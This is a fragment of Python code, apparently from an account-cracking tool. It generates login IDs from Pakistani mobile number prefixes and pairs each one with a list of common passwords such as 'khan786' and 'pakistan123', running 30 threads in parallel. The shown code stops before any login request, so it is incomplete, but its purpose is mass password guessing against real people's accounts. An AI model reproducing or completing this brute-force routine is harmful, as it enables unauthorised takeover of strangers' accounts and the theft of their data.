...
def bd():
                ...
                clear()
                pcp.append(f'y')
                print('\033[1;32m Code example: 0300,0345,0301,0315')
                ...
                with tred(max_workers=30) as sat:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khan786','khankhan','@#@#@#','123890','786786','khan123','alikhan123','janjan123','pakistan123','asif123']
